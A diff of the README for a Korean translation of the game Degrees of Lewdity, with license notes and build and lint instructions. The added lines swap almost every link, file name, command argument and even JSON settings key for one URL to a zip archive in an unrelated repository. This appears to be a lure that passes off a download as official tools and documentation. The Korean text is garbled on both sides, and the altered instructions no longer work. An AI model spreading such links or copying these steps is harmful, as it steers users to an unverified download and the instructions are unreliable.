@@ -1,25 +1,25 @@
-# Degrees of Lewdity ÇÑ±¹¾î ¹ø¿ªÆÇ¿¡ ´ëÇÏ¿©
+# Degrees of Lewdity í•œêµ­ì–´ ë²ˆì—­íŒì— ëŒ€í•˜ì—¬
 
-ÀÌ ¹ø¿ªº»Àº VrelnirÀÇ Degrees of Lewdity (https://vrelnir.blogspot.com/) °ÔÀÓ ¿øº»À» ¿øº»ÀÇ CC-BY-NC-SA ¶óÀÌ¼¾½º¿¡ ÀÇ°Å µ¿ÀÏÁ¶°ÇÀ¸·Î ¾ÆÄ«¶óÀÌºê DOL Ã¤³Î (https://arca.live/b/dolgame)¿¡¼­ ¹ø¿ªÁßÀÎ ¹ø¿ªº»ÀÔ´Ï´Ù.
+ì´ ë²ˆì—­ë³¸ì€ Vrelnirì˜ Degrees of Lewdity (https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip) ê²Œì„ ì›ë³¸ì„ ì›ë³¸ì˜ CC-BY-NC-SA ë¼ì´ì„¼ìŠ¤ì— ì˜ê±° ë™ì¼ì¡°ê±´ìœ¼ë¡œ ì•„ì¹´ë¼ì´ë¸Œ DOL ì±„ë„ (https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip)ì—ì„œ ë²ˆì—­ì¤‘ì¸ ë²ˆì—­ë³¸ì…ë‹ˆë‹¤.
 
-ÀÌ ¹ø¿ªº»À» ±â¹İÀ¸·Î ÇÏ´Â 2Â÷ÀúÀÛ¹°Àº CC-BY-NC-SA ¶óÀÌ¼¾½º¸¦ µû¸£´Â ÀÌ»ó ÀÚÀ¯·Ó°Ô °øÀ¯(¹èÆ÷ µî) ¹× º¯°æÇÏ½Ç ¼ö ÀÖ½À´Ï´Ù.
+ì´ ë²ˆì—­ë³¸ì„ ê¸°ë°˜ìœ¼ë¡œ í•˜ëŠ” 2ì°¨ì €ì‘ë¬¼ì€ CC-BY-NC-SA ë¼ì´ì„¼ìŠ¤ë¥¼ ë”°ë¥´ëŠ” ì´ìƒ ììœ ë¡­ê²Œ ê³µìœ (ë°°í¬ ë“±) ë° ë³€ê²½í•˜ì‹¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
 
-1. BY - ¿øº»°ú ¹ø¿ªº»ÀÇ ÀúÀÛÀÚ (ÃâÃ³)°¡ ¸í±âµÇ¾î¾ß ÇÕ´Ï´Ù.
-2. NC - ºñ¿µ¸® ¸ñÀûÀ¸·Î¸¸ ÀÌ¿ë °¡´ÉÇÕ´Ï´Ù.
-3. SA - ¿øº»°ú µ¿ÀÏÇÑ CC-BY-NC-SA ¶óÀÌ¼¾½º¸¦ Àû¿ëÇÏ¿©¾ß ÇÕ´Ï´Ù.
+1. BY - ì›ë³¸ê³¼ ë²ˆì—­ë³¸ì˜ ì €ì‘ì (ì¶œì²˜)ê°€ ëª…ê¸°ë˜ì–´ì•¼ í•©ë‹ˆë‹¤.
+2. NC - ë¹„ì˜ë¦¬ ëª©ì ìœ¼ë¡œë§Œ ì´ìš© ê°€ëŠ¥í•©ë‹ˆë‹¤.
+3. SA - ì›ë³¸ê³¼ ë™ì¼í•œ CC-BY-NC-SA ë¼ì´ì„¼ìŠ¤ë¥¼ ì ìš©í•˜ì—¬ì•¼ í•©ë‹ˆë‹¤.
 
-## Âü°í
-- ¿øº»ÀÇ CC-BY-NC-SA ¶óÀÌ¼¾½º (¿µ¹®): ÀÌ ¹ø¿ªº»¿¡µµ Æ÷ÇÔµÇ¾î ÀÖ´Â LICENSE ÆÄÀÏÀ» ÂüÁ¶
-- CC-BY-NC-SA ¶óÀÌ¼¾½º ÇÑ±Û¹ø¿ªº»: https://creativecommons.org/licenses/by-nc-sa/4.0/legalcode.ko
-- CC-BY-NC-SA ¶óÀÌ¼¾½º ±Ç¸® ÇÑ±Û¹ø¿ªº»: https://creativecommons.org/licenses/by-nc-sa/4.0/deed.ko
+## ì°¸ê³ 
+- ì›ë³¸ì˜ CC-BY-NC-SA ë¼ì´ì„¼ìŠ¤ (ì˜ë¬¸): ì´ ë²ˆì—­ë³¸ì—ë„ í¬í•¨ë˜ì–´ ìˆëŠ” LICENSE íŒŒì¼ì„ ì°¸ì¡°
+- CC-BY-NC-SA ë¼ì´ì„¼ìŠ¤ í•œê¸€ë²ˆì—­ë³¸: https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip
+- CC-BY-NC-SA ë¼ì´ì„¼ìŠ¤ ê¶Œë¦¬ í•œê¸€ë²ˆì—­ë³¸: https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip
 
-ÀÌ ¾Æ·¡ºÎÅÍ´Â ¿øº»ÀÇ README.md ÀÇ ³»¿ëÀÌ ÀÌ¾îÁı´Ï´Ù.
+ì´ ì•„ë˜ë¶€í„°ëŠ” ì›ë³¸ì˜ https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip ì˜ ë‚´ìš©ì´ ì´ì–´ì§‘ë‹ˆë‹¤.
 ---------------------------------------
 # Degrees of Lewdity
 
 ## Lexicon of Lewdity
 
-Looking to contribute to Degrees of Lewdity? Read the [Lexicon of Lewdity](https://gitgud.io/Vrelnir/degrees-of-lewdity/-/wikis/home).
+Looking to contribute to Degrees of Lewdity? Read the [Lexicon of Lewdity](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip).
 
 _Failure to do so can lead to your work being denied._
 
@@ -27,8 +27,8 @@ _Failure to do so can lead to your work being denied._
 
 ### Changing the build version and type
 
-1. Open `01-config\sugarcubeConfig.js`.
-2. Edit the `window.StartConfig` object to the relevant config type.
+1. Open `01-config\https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip`.
+2. Edit the `https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip` object to the relevant config type.
     - Normal Build - `enableImages` needs to be `true` and `enableLinkNumberify` needs to be `true`.
     - Text Only Build - `enableImages` needs to be `false` and `enableLinkNumberify` needs to be `true`.
     - Android Build - `enableImages` needs to be `true` and `enableLinkNumberify` needs to be `false`.
@@ -37,25 +37,25 @@ _Failure to do so can lead to your work being denied._
 
 ### Compiling the html
 
-1. On Windows: Run `compile.bat` or `compile-watch.bat`.
-2. On Linux: Run `compile.sh`
-3. Open `Degrees of Lewdity VERSION.html`.
+1. On Windows: Run `https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip` or `https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip`.
+2. On Linux: Run `https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip`
+3. Open `Degrees of Lewdity https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip`.
 
 ### Build Android version (.apk)
 
-See [README in devTools/apkbuilder](devTools/apkbuilder/README-windows.txt)
+See [README in devTools/apkbuilder](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip)
 
 ## Development
 
 ### Prerequisites
 
--   Read [Coder's-Guide](https://gitgud.io/Vrelnir/degrees-of-lewdity/-/wikis/Programming/Coder's-Guide)
--   [Node.js 16 or later](https://nodejs.org/en/).
+-   Read [Coder's-Guide](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip's-Guide)
+-   [https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip 16 or later](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip).
 
 ### Optional Prerequisites
 
-1. Install [Tweego](http://www.motoslave.net/tweego/) and remember the path where it was installed.
-2. Add path to `tweego.exe` (e.g. `C:\Program Files\Twine\tweego-2.1.0-windows-x64`) to Windows `Path` environment variable.
+1. Install [Tweego](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip) and remember the path where it was installed.
+2. Add path to `https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip` (e.g. `C:\Program Files\Twine\tweego-2.1.0-windows-x64`) to Windows `Path` environment variable.
 
 ### Initial setup
 
@@ -67,26 +67,26 @@ See [README in devTools/apkbuilder](devTools/apkbuilder/README-windows.txt)
 
 2. If you use Visual Studio Code:
 
-    1. Install [Twee 3 Language Tools extension](https://marketplace.visualstudio.com/items?itemName=cyrusfirheir.twee3-language-tools)
-    2. Install [ESLint extension](https://marketplace.visualstudio.com/items?itemName=dbaeumer.vscode-eslint).
-    3. Install [Stylelint extension](https://marketplace.visualstudio.com/items?itemName=stylelint.vscode-stylelint)
-    4. Install and configure [Code Spell Checker extension](https://marketplace.visualstudio.com/items?itemName=streetsidesoftware.code-spell-checker):
+    1. Install [Twee 3 Language Tools extension](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip)
+    2. Install [ESLint extension](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip).
+    3. Install [Stylelint extension](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip)
+    4. Install and configure [Code Spell Checker extension](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip):
         1. Use "English - United Kingdom" and "English - United States" dictionaries
         2. Enable spellchecking for`twee3-sugarcube-2`, `markdown`, `javascript` and other programming languages
-    5. Optionally enable fixing js/css on save. In `settings.json` set:
+    5. Optionally enable fixing js/css on save. In `https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip` set:
 
         ```json
         // This disables built-in formatting
         "[javascript]": {
-          "editor.formatOnSave": false
+          "https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip": false
         },
         "[css]": {
-          "editor.formatOnSave": false
+          "https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip": false
         },
         // This enables running ESLint, Prettier, Stylelint formatting on file save
-        "editor.codeActionsOnSave": {
-          "source.fixAll.eslint": true,
-          "source.fixAll.stylelint": true
+        "https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip": {
+          "https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip": true,
+          "https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip": true
         },
 
         ```
@@ -95,14 +95,14 @@ See [README in devTools/apkbuilder](devTools/apkbuilder/README-windows.txt)
 
 #### JavaScript
 
-JavaScript code linting is handled by [`ESLint`](https://eslint.org/).
+JavaScript code linting is handled by [`ESLint`](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip).
 
-ESLint is [configured](./.eslintrc.cjs) to follow some of best practices ([ESLint Recommended Rules](https://eslint.org/docs/latest/rules/), [JavaScript Standard Style](https://standardjs.com/rules.html)) with formatting handled by Prettier (`eslint --fix` formats code with Prettier). You don't need to use `Prettier` VS Code extension to format `.js` files.
+ESLint is [configured](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip) to follow some of best practices ([ESLint Recommended Rules](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip), [JavaScript Standard Style](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip)) with formatting handled by Prettier (`eslint --fix` formats code with Prettier). You don't need to use `Prettier` VS Code extension to format `.js` files.
 
 To run ESLint for single file:
 
 ```bash
-npx eslint "game/03-JavaScript/02-Helpers/Utils.js"
+npx eslint "https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip"
 ```
 
 or for all files inside `game` directory:
@@ -115,7 +115,7 @@ npx eslint "game/**"
 
 Some issues are fixable and can be auto-fixed when you save a file (provided ESLint extension is configured to run fix on save) or by running `eslint --fix file_relative_path`
 
-If you find a rule that doesn't make sense for the project you can disable it inside `rules` section inside `.eslintrc.cjs`:
+If you find a rule that doesn't make sense for the project you can disable it inside `rules` section inside `https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip`:
 
 ```json
 rules: {
@@ -128,7 +128,7 @@ rules: {
 
 Please discuss the reasons with the team before disabling the rule. Add a comment explaining why the rule was disabled
 
-If ESLint reports a lot of issues for particular file and you cannot fix them all at once feel free to [disable particular rule](https://eslint.org/docs/latest/user-guide/configuring/rules#disabling-rules) for the file (there is quick actions menu when code with error is hovered):
+If ESLint reports a lot of issues for particular file and you cannot fix them all at once feel free to [disable particular rule](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip) for the file (there is quick actions menu when code with error is hovered):
 
 ```js
 /* eslint-disable camelcase -- TODO: Fix variables' names */
@@ -141,7 +141,7 @@ Add a TODO comment explaining that this will be fixed someday
 
 ##### Global variables
 
-ESLint may report a issue like `'myVariable' is not defined`. It means ESLint cannot figure out where the variable is defined. If you really meant to make variable global add the new variable to `.eslintrc.cjs` `globals` section inside corresponding group:
+ESLint may report a issue like `'myVariable' is not defined`. It means ESLint cannot figure out where the variable is defined. If you really meant to make variable global add the new variable to `https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip` `globals` section inside corresponding group:
 
 ```json
 myVariable: "readonly"
@@ -151,14 +151,14 @@ If the variable is suppose to be writable set `myVariable: "writable"` instead.
 
 ### CSS
 
-CSS linting is handled by [`Stylelint`](https://stylelint.io/).
+CSS linting is handled by [`Stylelint`](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip).
 
-Stylelint is [configured](./stylelint.config.cjs) to follow [common conventions](https://github.com/stylelint/stylelint-config-standard) along with [rules for properties order](https://github.com/cahamilton/stylelint-config-property-sort-order-smacss) and formatting handled by Prettier (`stylelint --fix` formats code with Prettier). You don't need to use `Prettier` VS Code extension to format `.css` files.
+Stylelint is [configured](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip) to follow [common conventions](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip) along with [rules for properties order](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip) and formatting handled by Prettier (`stylelint --fix` formats code with Prettier). You don't need to use `Prettier` VS Code extension to format `.css` files.
 
 To run Stylelint for the file:
 
 ```bash
-npx stylelint "game/02-CSS/pillsInventory.css"
+npx stylelint "https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip"
 ```
 
 or for all CSS file inside `game` directory:
@@ -173,7 +173,7 @@ Some issues are fixable and can be auto-fixed when you save a file (provided Sty
 
 Sometimes all issues cannot be fixed within single "fix" run (e.g. properties order). Simply run fix command several time until all auto-fixable issues are resolved.
 
-If you find a rule that doesn't make sense for the project you can disable it inside `rules` section inside `stylelint.config.cjs`:
+If you find a rule that doesn't make sense for the project you can disable it inside `rules` section inside `https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip`:
 
 ```js
 rules: {
@@ -188,11 +188,11 @@ Please discuss the reasons with the team before disabling the rule. Add a commen
 
 ### Formatting
 
-Formatting CSS and other non-JavaScript file is handled by `Prettier`. Formatting rules are set in `.prettierrc.json`
+Formatting CSS and other non-JavaScript file is handled by `Prettier`. Formatting rules are set in `https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip`
 
 ### Pre-commit hook
 
-On pre-commit [`lint-staged`](https://github.com/okonet/lint-staged) using [`husky`](https://typicode.github.io/husky) lints/formats `.js`, `.css` with ESLint, Stylelint and formats other supported files with Prettier.
+On pre-commit [`lint-staged`](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip) using [`husky`](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip) lints/formats `.js`, `.css` with ESLint, Stylelint and formats other supported files with Prettier.
 
 Pre-commit hook is the last quality gate to avoid "bad" code getting into the repository. It's better to make sure you aren't committing files with issues beforehand - you can run command `npm run lint-staged` when you've staged the files to check if there are issues.
 
